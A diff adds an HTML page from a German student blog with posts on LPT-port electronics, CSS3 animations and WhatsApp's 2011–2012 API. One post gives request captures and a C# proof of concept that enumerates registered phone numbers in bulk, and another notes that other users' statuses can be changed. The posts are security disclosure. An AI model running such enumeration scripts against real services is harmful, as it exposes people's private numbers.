@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="de">
+  <head>
+    <!-- meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="keywords" content="Johannes Mittendorfer, Mittendorfer, Blog, Informatik, Student, Entwicklung, Security">
+    <meta name="description" content="Der Blog von Informatik-Student Johannes Mittendorfer über das Leben im Studium, Software-Entwicklung, IT-Security und das Internet">
+    <meta name="author" content="Johannes Mittendorfer">
+    <meta http-equiv="cleartype" content="on">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
+    <meta name="application-name" content="Johannes Mittendorfer"/>
+    <meta name="msapplication-TileColor" content="#f9fbf4"/>
+    <meta http-equiv="imagetoolbar" content="false" />
+    <meta property="fb:admins" content="100000063853580" />
+    <meta name="Content-Language" content="de" />
+    <!-- resources -->
+    <link rel="shortcut icon" href="/assets/favicon.ico">
+    <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml">
+    <link rel="canoncial" href="https://blog.johannes-mittendorfer.com/24/">
+    <!-- styles -->
+    <link rel="stylesheet" href="/assets/css/styles.css"/>
+    <!-- title -->
+    <title>Johannes Mittendorfer - Informatikstudent</title>
+    <!-- page specific resources -->
+  </head>
+  <body itemscope itemtype="http://schema.org/WebSite">
+    <!-- menu bar -->
+    <nav id="bar">
+      <section class="container">
+        <a class="title" itemprop="url" href="/">
+          <h1 itemprop="name">Johannes Mittendorfer</h1>
+        </a>
+        <ul>
+          <li>
+            <a href="/">
+              Start
+            </a>
+          </li>
+          <li>
+            <a itemprop="about" href="/ueber-mich" title="Über">
+              Über
+            </a>
+          </li>
+          <li>
+            <a href="/astronomie" title="Astronomie">
+              Astronomie
+            </a>
+          </li>
+          <li>
+            <a href="/impressum" title="Impressum">
+              Impressum
+            </a>
+          </li>
+        </ul>
+      </section>
+    </nav>
+    <!-- main content -->
+    <div class="container">
+      <main>
+        <div id="article-list" itemscope itemtype="http://schema.org/Blog">
+          <meta itemprop="description" content="Blog von Johannes Mittendorfer"/>
+          <meta itemprop="about" content="https://johannes-mittendorfer.com/ueber-mich"/>
+          <meta itemprop="author" content="https://johannes-mittendorfer.com/ueber-mich"/>
+          <article itemscope itemtype="http://schema.org/BlogPosting">
+            <header>
+              <div class="meta">
+                <span class="category">Security</span> &ndash; 
+                <time itemprop="datePublished" datetime="2012-02-09T00:00:00+01:00" class="date">09.02.2012</time> &ndash;
+                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
+              </div>
+              <a href="/artikel/2012/02/das-whatsapp-registrierungsprotokoll">
+                <h2 itemprop="headline">Das WhatsApp-Registrierungsprotokoll</h2>
+              </a>
+              <div class="warning">
+                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
+              </div>
+            </header>
+            <div itemprop="articleBody">
+              <p>Da ich aus den Suchanfragen die auf meiner Homepage landen schließe, dass hier Interesse besteht, möchte ich hiermit nocheinmal kurz den Registrierungsvorgang bei WhatsApp mit den dafür verwendeten REST Urls beschreiben.</p>
+              <p><img src="/assets/img/picture_75.jpeg" alt="Whatsapp Logo" /></p>
+              <h2 id="überprüfen-ob-schon-registriert">Überprüfen, ob schon registriert</h2>
+              <p>Beim Starten der App und nach der Eingabe der Rufnummer wird zunächst überprüft, ob diese Nummer bereits bei WhatsApp registriert ist.</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">https://r.whatsapp.net/v1/exist.php?cc=43&amp;in=664XXXXXXX&amp;udid=d59d27f4d300d595..</code></pre>
+              </figure>
+              <h2 id="bestätigungs-sms-verschicken">Bestätigungs-SMS verschicken</h2>
+              <p>Um die Rufnummer zu bestätigen wird im nächsten Schritt eine SMS an die angegebene Nummer verschickt.</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">https://r.whatsapp.net/v1/code.php?method=sms&amp;to=43664XXXXXXX&amp;in=664XXXXXXX&amp;cc=43&amp;lg=de
+c=AT&amp;mcc=000&amp;mnc=000</code></pre>
+              </figure>
+              <h2 id="registrierung">Registrierung</h2>
+              <p>Zur entgültigen Registrierung wird nun folgende Anfrage mit dem Bestätigungscode aus der SMS abgeschickt:</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">https://r.whatsapp.net/v1/register.php?cc=43&amp;in=664XXXXXXX&amp;udid=d59d27f4d300d595...&amp;code=774</code></pre>
+              </figure>
+              <p>Nach diesem Vorgang ist die Registrierung für ein WhatsApp-Konto abgeschlossen und der Benutzer kann von anderen Anwendern der App gefunden werden. Wie dieser und andere Vorgänge bei der Verwendung der App funktionieren, beschreibe ich im Folgenden:</p>
+              <h2 id="kontake-hochladen">Kontake hochladen</h2>
+              <p>Um diese Kontakte zu finden werden die Telefonnummern der Kontakte auf einen WhatsApp-Server übertragen. Den Vorgang habe ich außerdem schon <a href="http://johannes-mittendorfer.com/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern">hier</a> beschrieben und <a href="http://futurezone.at/produkte/7319-schwere-sicherheitsluecken-in-messenger-apps.php">hier</a> gibt es einen Artikel darüber.</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">https://sro.whatsapp.net/client/iphone/iq.php?cd=1&amp;c=43&amp;u[]=0664XXXXXXX&amp;u[]=0699XXXXXXX</code></pre>
+              </figure>
+              <p><img src="/assets/img/picture_76.png" alt="Whatsapp App" /></p>
+              <h2 id="status-ändern">Status ändern</h2>
+              <p>Seinen aktuellen Status kann man über folgende Abfrage ändern. Aber nicht nur seinen eigenen Status.</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">POST https://s.whatsapp.net/client/iphone/u.php 
+cc=43&amp;me=+43664XXXXXXX&amp;s=Hey%20there!%20I%20am%20using%20WhatsApp</code></pre>
+              </figure>
+              <h2 id="bild-upload">Bild-Upload</h2>
+              <p>Um Bilder an seine Kontake zu verschicken werden diese durch folgende Abfrage hochgeladen. Wie der Name “89b49902234aa5afc2bdff95bfa0c3fd.jpg” zustande kommt ist mir noch nicht ganz klar.</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">POST http://mms.whatsapp.net/client/iphone/upload.php
+------WebKitFormBoundaryCPJPtl1Gsxx5Dr12
+Content-Disposition: attachment; name="file" filename="89b49902234aa5afc2bdff95bfa0c3fd.jpg"
+Content-Type: image/jpeg</code></pre>
+              </figure>
+              <h2 id="bilder-download">Bilder-Download</h2>
+              <p>Das hochgeladene Bild kann nun über diese Adresse wieder erreicht werden:</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">https://mms401.whatsapp.net/d4/31/06/3/7/37b1703abfdc2a9c6e1f005e3134c271.jpg</code></pre>
+              </figure>
+              <p>Die Bilder werden jedoch <a href="https://mms401.whatsapp.net/d4/31/06/3/7/37b1703abfdc2a9c6e1f005e3134c271.jpg">augenscheinlich</a> nach einiger Zeit wieder gelöscht.</p>
+              <h2 id="hinweis">Hinweis</h2>
+              <p>Ich rufe hiermit ausdrücklich <strong>nicht</strong> zu einem Missbrauch des Dienstes aus und verfolge mit diesem Artikel nur über die Sicherheit der übertragung persönlicher Daten zu informieren.</p>
+              <h2 id="update-10-februar-2012">Update (10. Februar 2012)</h2>
+              <p>Angeblich wurden mehrere Sicherheitslücken von WhatsApp inzwischen gestopft.</p>
+            </div>
+          </article>
+          <article itemscope itemtype="http://schema.org/BlogPosting">
+            <header>
+              <div class="meta">
+                <span class="category">Entwicklung</span> &ndash; 
+                <time itemprop="datePublished" datetime="2012-01-05T00:00:00+01:00" class="date">05.01.2012</time> &ndash;
+                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
+              </div>
+              <a href="/artikel/2012/01/elektronik-uber-den-lpt-port-steuern">
+                <h2 itemprop="headline">Elektronik über den LPT-Port steuern</h2>
+              </a>
+              <div class="warning">
+                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
+              </div>
+            </header>
+            <div itemprop="articleBody">
+              <p>Öfters möchte man einen kleinen oder auch größeren Schaltkreis über den PC steuern, wäre da nicht die komplizierte Umsetzung mit einem geeigneten Mikrocontroller und der benötigten Software.</p>
+              <p>Doch es geht viel einfacher: Der parellele Port, auch LPT-Port genannt, steht auf den meisten PC zur Verfügung und kann Kinderleicht dazu verwendet werden verschiedenen Pins einzeln mit Spannung zu versorgen.</p>
+              <h2 id="hardware">Hardware</h2>
+              <p><img src="/assets/img/picture_73.png" alt="Port des parallelen Anschlusses" /></p>
+              <p>Dieser Anschluss, der vormals DER Standard für den Anschluss eines Druckers war, lässt sich für die Steuerung eines Schaltkreises verwenden indem man einen Draht in einen der Pins 2-9 und einen Draht in einen Pin von 18 bis 25 steckt.</p>
+              <p>Die Pins 2 bis 9 können einzeln vom PC mit Spannung geschaltet werden und stellen eine (Steuer-)Spannung von ca. 5 V bereit. Diese Spannung <strike>kann</strike> sollte mit einem Transistor verwendet werden, um über einen Steuerstromkreis den Arbeitsstromkreis mit (nahezu) beliebiger Spannung zu betreiben.</p>
+              <p>Außerdem kann über die Pins 10-13 ein Signal enpfangen werden, was in diesem Fall bedeutet, dass der Stromkreis geschlossen ist und Strom von den Pins 18-25 zu den Pins 10-13 fließt.</p>
+              <p>Ein LPT-Kabel, das in meinem Fall einen alten Drucker mit Daten versorgte, verlegt den Anschluss bequem nach vorne und erspart einem so manchen Schlag mit dem Kopf gegen die Tischplatte.</p>
+              <h2 id="software">Software</h2>
+              <p>Beispiel eines TCP-Clients zum Steuern einer LED:</p>
+              <p><img src="/assets/img/picture_74.png" alt="Beispiel GUI" /></p>
+              <p>Für das einfache Anlegen einer Spannung auf einem Pin empfehle ich das Programme lptout.exe. Für komplexere Aufgaben ist jedoch die Klasse inpout32.dll bzw. inpout64.dll geeignet. Da ich keine Rechte für die genannten Programme besitze, möchte ich nicht auf einen Download verlinken, doch eine Google-Suche bringt einem schnell ans Ziel.</p>
+              <p>Ich habe mir für leichtere Handhabung eine kleine C#-Klasse geschrieben:</p>
+              <figure class="highlight">
+                <pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
+<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>
+
+<span class="k">namespace</span> <span class="nn">WindowsFormsApplication1</span><span class="p">{</span>
+
+	<span class="k">public</span> <span class="k">class</span> <span class="nc">LPTController</span><span class="p">{</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">UInt32</span> <span class="nf">IsInpOutDriverOpen</span><span class="p">();</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="k">void</span> <span class="nf">Out32</span><span class="p">(</span><span class="kt">short</span> <span class="n">PortAddress</span><span class="p">,</span> <span class="kt">short</span> <span class="n">Data</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">char</span> <span class="nf">Inp32</span><span class="p">(</span><span class="kt">short</span> <span class="n">PortAddress</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="k">void</span> <span class="nf">DlPortWritePortUshort</span><span class="p">(</span><span class="kt">short</span> <span class="n">PortAddress</span><span class="p">,</span> <span class="kt">ushort</span> <span class="n">Data</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">ushort</span> <span class="nf">DlPortReadPortUshort</span><span class="p">(</span><span class="kt">short</span> <span class="n">PortAddress</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="k">void</span> <span class="nf">DlPortWritePortUlong</span><span class="p">(</span><span class="kt">int</span> <span class="n">PortAddress</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">Data</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpout32.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">uint</span> <span class="nf">DlPortReadPortUlong</span><span class="p">(</span><span class="kt">int</span> <span class="n">PortAddress</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpoutx64.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">GetPhysLong</span><span class="p">(</span><span class="k">ref</span> <span class="kt">int</span> <span class="n">PortAddress</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">uint</span> <span class="n">Data</span><span class="p">);</span>
+
+		<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"inpoutx64.dll"</span><span class="p">)]</span>
+		<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">SetPhysLong</span><span class="p">(</span><span class="k">ref</span> <span class="kt">int</span> <span class="n">PortAddress</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">uint</span> <span class="n">Data</span><span class="p">);</span>
+
+		<span class="k">private</span> <span class="kt">bool</span> <span class="n">_X64</span><span class="p">;</span>
+		<span class="k">private</span> <span class="kt">short</span> <span class="n">_PortAddress</span><span class="p">;</span>
+
+		<span class="k">public</span> <span class="nf">LPTController</span><span class="p">(</span><span class="kt">short</span> <span class="n">PortAddress</span><span class="p">){</span>
+			<span class="n">_X64</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+			<span class="n">_PortAddress</span> <span class="p">=</span> <span class="n">PortAddress</span><span class="p">;</span>
+		
+			<span class="k">try</span><span class="p">{</span>
+				<span class="kt">uint</span> <span class="n">nResult</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+				<span class="k">try</span><span class="p">{</span>
+					<span class="n">nResult</span> <span class="p">=</span> <span class="nf">IsInpOutDriverOpen</span><span class="p">();</span>
+				<span class="p">}</span>
+				<span class="k">catch</span> <span class="p">(</span><span class="n">BadImageFormatException</span><span class="p">){</span>
+
+				<span class="p">}</span>
+				<span class="k">if</span> <span class="p">(</span><span class="n">nResult</span> <span class="p">==</span> <span class="m">0</span><span class="p">){</span>
+					<span class="k">throw</span> <span class="k">new</span> <span class="nf">ArgumentException</span><span class="p">(</span><span class="s">"Unable to open InpOut32 driver"</span><span class="p">);</span>
+				<span class="p">}</span>
+			<span class="p">}</span>
+			<span class="k">catch</span> <span class="p">(</span><span class="n">DllNotFoundException</span><span class="p">){</span>
+				<span class="k">throw</span> <span class="k">new</span> <span class="nf">ArgumentException</span><span class="p">(</span><span class="s">"Unable to find InpOut32.dll"</span><span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		
+		<span class="k">public</span> <span class="k">void</span> <span class="nf">Write</span><span class="p">(</span><span class="kt">short</span> <span class="n">Data</span><span class="p">){</span>
+			<span class="nf">Out32</span><span class="p">(</span><span class="n">_PortAddress</span><span class="p">,</span> <span class="n">Data</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="k">public</span> <span class="kt">byte</span> <span class="nf">Read</span><span class="p">(){</span>
+			<span class="k">return</span> <span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="nf">Inp32</span><span class="p">(</span><span class="n">_PortAddress</span><span class="p">);</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span></code></pre>
+              </figure>
+              <p>Mit dieser Klasse kann man einfach den Zustand Auslesen und ihn ändern:</p>
+              <figure class="highlight">
+                <pre><code class="language-csharp" data-lang="csharp"><span class="n">LPTController</span> <span class="n">lpt</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">LPTController</span><span class="p">(</span><span class="m">888</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="n">lpt</span><span class="p">.</span><span class="nf">Read</span><span class="p">()</span> <span class="p">==</span> <span class="m">255</span><span class="p">){</span>
+	<span class="n">lpt</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span>
+	<span class="n">lpt</span><span class="p">.</span><span class="nf">Write</span><span class="p">(</span><span class="m">255</span><span class="p">);</span>
+<span class="p">}</span></code></pre>
+              </figure>
+              <h2 id="hinweis">Hinweis</h2>
+              <p>Natürlich geschieht das alles auf Ihre eigene Gefahr und ich übernehme keine Haftung für jedwede Schäden an Gerät und Gesundheit. 230V haben hier nichts verloren!!!</p>
+              <p>Update 13.03.2016: Natürlich muss es der parallele und nicht der serielle Port.</p>
+            </div>
+          </article>
+          <article itemscope itemtype="http://schema.org/BlogPosting">
+            <header>
+              <div class="meta">
+                <span class="category">Security</span> &ndash; 
+                <time itemprop="datePublished" datetime="2011-12-03T00:00:00+01:00" class="date">03.12.2011</time> &ndash;
+                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
+              </div>
+              <a href="/artikel/2011/12/whatsapp-erlaubt-bruteforce-auf-telefonnummern">
+                <h2 itemprop="headline">WhatsApp erlaubt Bruteforce auf Telefonnummern</h2>
+              </a>
+              <div class="warning">
+                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
+              </div>
+            </header>
+            <div itemprop="articleBody">
+              <p>Eine Telefonnummer möchte man meist gerne für sich behalten, um nicht von Personen belästigt zu werden und einfach seine Ruhe zu haben. Mit der Nutzung der weitverbreiteten WhatsApp-Anwendung auf seinem Mobiltelefon macht man jedoch möglich die Rufnummern der angemeldeten Benutzer zu durchsuchen. In der App wird angezeigt welche seiner Kontakte bereits für WhatsApp registriert sind.</p>
+              <p>Dazu wird eine Anfrage mit den Telefonnummern seiner Kontakte an den WhatsApp-Server <em>sro.whatsapp.net</em> geschickt:</p>
+              <figure class="highlight">
+                <pre><code class="language-text" data-lang="text">POST /client/iphone/iq.php HTTP/1.1 
+Host: sro.whatsapp.net 
+User-Agent: WhatsApp/2.6.7 iPhone_OS/4.3.3 Device/iPhone 
+Accept: */* 
+Accept-Language: de-de 
+Accept-Encoding: gzip, deflate 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 710 
+Connection: keep-alive 
+Proxy-Connection: keep-alive 
+
+cd=1&amp;amp;cc=43&amp;amp;me=664XXXXXXX&amp;amp;u[]=0699XXXXXXX&amp;amp;u[]=0680XXXXXXX</code></pre>
+              </figure>
+              <p>Im Body der POST-Anfrage an <code class="highlighter-rouge">/client/iphone/iq.php</code> werden die Telefonnummern als Array (?) in der Form des GET-Parameters <code class="highlighter-rouge">u[]=XXXXXXXXXXX</code> übermittelt. Der Parameter <em>me</em> muss jedoch nicht angegeben werden. Zudem darf die Anfrage auch über <em>GET</em> erfolgen. Auf die Anfrage antwortet der Server mit dem Status der Teilnehmer im plist-Format:</p>
+              <figure class="highlight">
+                <pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;array&gt;</span>
+		<span class="nt">&lt;dict&gt;</span>
+			<span class="nt">&lt;key&gt;</span>P<span class="nt">&lt;/key&gt;</span>
+			<span class="nt">&lt;string&gt;</span>0043664.......<span class="nt">&lt;/string&gt;</span>
+			<span class="nt">&lt;key&gt;</span>T<span class="nt">&lt;/key&gt;</span>
+			<span class="nt">&lt;integer&gt;</span>199610<span class="nt">&lt;/integer&gt;</span>
+			<span class="nt">&lt;key&gt;</span>S<span class="nt">&lt;/key&gt;</span>
+			<span class="nt">&lt;string&gt;</span>....<span class="nt">&lt;/string&gt;</span>
+			<span class="nt">&lt;key&gt;</span>JID<span class="nt">&lt;/key&gt;</span>
+			<span class="nt">&lt;string&gt;</span>43664.......<span class="nt">&lt;/string&gt;</span>
+		<span class="nt">&lt;/dict&gt;</span>
+	<span class="nt">&lt;/array&gt;</span>
+<span class="nt">&lt;/plist&gt;</span></code></pre>
+              </figure>
+              <p>So ist es natürlich auch möglich einen Brute-Force Angriff auf Handynummern zu starten, und das funktioniert auch. Man kann zum Beispiel hundert Nummern generieren lassen, die man dann alle zusammen an den WhatsApp-Server übermittelt. Daraufhin erhält man alle Benutzer in diesem Bereich, die WhatsApp benutzen. Als ein Proof-of-Concept habe ich ein kleines Programm in C# zusammengestöpselt, das Telefonnummern aus einem bestimmten Bereich generiert und diese anschließ;end an den passenden WhatsApp-Server schickt. Anschließ;end wird der Inhalt der plist-Datei in der Konsole ausgegeben.</p>
+              <figure class="highlight">
+                <pre><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span> 
+<span class="k">using</span> <span class="nn">System.Collections.Generic</span><span class="p">;</span> 
+<span class="k">using</span> <span class="nn">System.Linq</span><span class="p">;</span> 
+<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span> 
+<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span> 
+
+<span class="k">namespace</span> <span class="nn">WhatsAppBrute</span><span class="p">{</span>
+	<span class="k">class</span> <span class="nc">Program</span><span class="p">{</span>
+		<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">){</span>
+			<span class="n">WebClient</span> <span class="n">c</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebClient</span><span class="p">();</span> 
+			<span class="n">String</span> <span class="n">start</span> <span class="p">=</span> <span class="s">"https://sro.whatsapp.net/client/iphone/iq.php?cd=1&amp;amp;cc=43"</span> 
+			
+			<span class="k">for</span> <span class="p">(</span><span class="n">Int32</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="m">100</span><span class="p">;</span> <span class="n">i</span><span class="p">++){</span>
+				<span class="n">String</span> <span class="n">count</span><span class="p">;</span> 
+				
+				<span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="p">&lt;</span> <span class="m">10</span><span class="p">){</span>
+					<span class="n">count</span> <span class="p">=</span> <span class="s">"0"</span> <span class="p">+</span> <span class="n">i</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span> 
+				<span class="p">}</span> 
+				<span class="k">else</span> <span class="p">{</span> 
+					<span class="n">count</span> <span class="p">=</span> <span class="n">i</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span> 
+				<span class="p">}</span> 
+				
+				<span class="n">start</span> <span class="p">+=</span> <span class="s">"&amp;u[]=0664XXXXX"</span> <span class="p">+</span> <span class="n">count</span><span class="p">;</span> 
+			<span class="p">}</span> 
+			
+			<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">c</span><span class="p">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="n">start</span><span class="p">));</span> 
+			<span class="n">Console</span><span class="p">.</span><span class="nf">ReadLine</span><span class="p">();</span> 
+		<span class="p">}</span>
+	<span class="p">}</span> 
+<span class="p">}</span></code></pre>
+              </figure>
+              <p><strong>Dieser Code dient nur zu Vorführzwecken und darf nicht für einen Angriff auf die Server von WhatsApp verwendet werden!</strong></p>
+              <p>Fazit: Es ist erschreckend wie einfach eine solche Anfrage ausgeführt werden kann und wie freizügig mit den Telefonnummern umgegangen wird. Natürlich wird nicht jeder Benutzer eine so umständliche Art benutzen (wollen), aber es ist möglich.</p>
+            </div>
+          </article>
+          <article itemscope itemtype="http://schema.org/BlogPosting">
+            <header>
+              <div class="meta">
+                <span class="category">Entwicklung</span> &ndash; 
+                <time itemprop="datePublished" datetime="2011-10-19T00:00:00+02:00" class="date">19.10.2011</time> &ndash;
+                <a itemprop="author" href="https://blog.johannes-mittendorfer.com/ueber-mich">Johannes Mittendorfer</a>
+              </div>
+              <a href="/artikel/2011/10/css3-animationen-ein-erster-einstieg">
+                <h2 itemprop="headline">CSS3 Animationen - Ein erster Einstieg</h2>
+              </a>
+              <div class="warning">
+                Dieser Artikel ist älter als zwei Jahre und womöglich veraltet!
+              </div>
+            </header>
+            <div itemprop="articleBody">
+              <p>Vielleicht haben Sie schon einmal davon gehört: CSS3-Animationen. Es soll also möglich sein nur mit CSS eine kleine Animation zu erstellen. Doch wie geht das?
+                Am Besten probieren wir es einmal an einem kleinen Beispiel, um die Grundzüge zu verstehen.</p>
+              <p>Wir nehmen an, wir wollen einen einfachen Text rotieren lassen:</p>
+              <p><a href="http://demo.johannes-mittendorfer.com/css3animation/">Demo</a></p>
+              <p>Zuerst wird die Animation im CSS der Seite definiert:</p>
+              <figure class="highlight">
+                <pre><code class="language-css" data-lang="css"><span class="k">@keyframes</span> <span class="n">move</span>
+<span class="p">{</span>
+	<span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">margin-left</span><span class="p">:</span> <span class="m">500px</span><span class="p">;}</span>
+	<span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">transform</span><span class="p">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">360deg</span><span class="p">);}</span>
+<span class="p">}</span></code></pre>
+              </figure>
+              <p>Zur Erklärung: Man erstellt ein Definition mit dem Namen <code class="highlighter-rouge">@keyframes</code> und benennt es ganz nach seinen Vorlieben. Ich habe die Animation hier <em>move</em> genannt. In den Anweisungen für dieses Element wird für die jeweiligen Animationsfortschritt in Prozent der Zustand abspeichern. Hier zum Beispiel eine Rotation um 360° und bei 50% eine Verchiebung zu <em>margin-left: 500px</em>.</p>
+              <p>Aber: So einfach läuft es auf der Welt einfach nun einmal nicht: Natürlich funktioniert es bei Firefox nur mit  <code class="highlighter-rouge">@-moz-keyframes</code> und bei Safari und Chrome nur mit <code class="highlighter-rouge">@-webkit-keyframes</code> und <em>transform</em> braucht natürlich auch noch ein Prefix. Und ja: Der Internet-Explorer fällt durch, war ja klar.</p>
+              <p>Also nochmal für alle:</p>
+              <figure class="highlight">
+                <pre><code class="language-css" data-lang="css"><span class="k">@keyframes</span> <span class="n">move</span>
+<span class="p">{</span>
+  <span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">margin-left</span><span class="p">:</span> <span class="m">500px</span><span class="p">;}</span>
+  <span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">transform</span><span class="p">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">360deg</span><span class="p">);}</span>
+<span class="p">}</span>
+<span class="k">@-moz-keyframes</span> <span class="n">move</span>
+<span class="p">{</span>
+  <span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">margin-left</span><span class="p">:</span> <span class="m">500px</span><span class="p">;}</span>
+  <span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">-moz-transform</span><span class="p">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">360deg</span><span class="p">);}</span>
+<span class="p">}</span>
+<span class="k">@-webkit-keyframes</span> <span class="n">move</span>
+<span class="p">{</span>
+	<span class="err">50</span><span class="o">%</span> <span class="p">{</span> <span class="nl">margin-left</span><span class="p">:</span> <span class="m">500px</span><span class="p">;}</span>
+	<span class="err">100</span><span class="o">%</span> <span class="p">{</span> <span class="nl">-webkit-transform</span><span class="p">:</span> <span class="n">rotate</span><span class="p">(</span><span class="m">360deg</span><span class="p">);}</span>
+<span class="p">}</span></code></pre>
+              </figure>
+              <p>Jetzt wird der CSS-Definition die gewünschte Animation zugewiesen:</p>
+              <figure class="highlight">
+                <pre><code class="language-css" data-lang="css"><span class="nc">.demo_object</span><span class="p">{</span>
+	<span class="nl">animation</span><span class="p">:</span> <span class="n">move</span> <span class="m">2s</span> <span class="n">infinite</span><span class="p">;</span>
+<span class="p">}</span></code></pre>
+              </figure>
+              <p>Es läuft also nach dem Muster:</p>
+              <p>*animation: <Name der="" Animation=""> <Länge der="" Animation=""> [unendlichkeit (optional)]*</Länge></Name></p>
+              <p>Man gibt den Namen der Animation, die vorher definiert wurde und danach die gewünschte Länge der Animation an. Zusätzlich kann man noch defninieren, ob die Animation unendlich wiederholt werden soll, und zwar mit <em>infinite</em>.</p>
+              <p>Und, Sie ahnen es schon, das Spiel wiederholt sich. Also:</p>
+              <figure class="highlight">
+                <pre><code class="language-css" data-lang="css"><span class="nc">.demo_object</span><span class="p">{</span>
+	<span class="nl">animation</span><span class="p">:</span> <span class="n">move</span> <span class="m">2s</span> <span class="n">infinite</span><span class="p">;</span>
+	<span class="nl">-moz-animation</span><span class="p">:</span> <span class="n">move</span> <span class="m">2s</span> <span class="n">infinite</span><span class="p">;</span>
